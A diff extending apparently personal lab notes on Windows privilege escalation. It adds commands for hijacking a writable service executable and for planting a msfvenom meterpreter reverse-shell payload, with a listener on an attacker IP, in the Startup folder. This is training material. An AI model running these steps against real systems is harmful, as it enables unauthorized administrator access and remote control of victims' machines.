@@ -7,6 +7,8 @@
 5. [getsystem](#getsystem)
 6. [runas](#runas)
 7. [Registry](#registry)
+8. [Executable Files](#executable-files)
+9. [Startup Applications](#startup-applications)
 
 ## Kernel Exploits
 
@@ -355,4 +357,48 @@ sc start regsvc
 
 net localgroup administrators
 #our user is added to administrators group
+```
+
+## Executable Files
+
+```shell
+#in victim cmd prompt
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+#'everyone' user group has all access permission on filepermservice.exe
+
+#similar to regsvc
+#create and upload malicious exe to C:\Temp
+copy /y C:\Temp\x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+sc start filepermsvc
+
+net localgroup administrators
+#our user is added to admin group
+```
+
+## Startup Applications
+
+```shell
+#in windows cmd prompt
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+#BUILTIN\Users group has full access (F) to directory
+
+#in attacker machine
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.31.212 -f exe -o x.exe
+
+msfconsole -q
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 10.14.31.212
+
+run
+
+#now copy x.exe to windows machine
+move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+#logout and then login as administrator
+#we get a meterpreter shell now
 ```
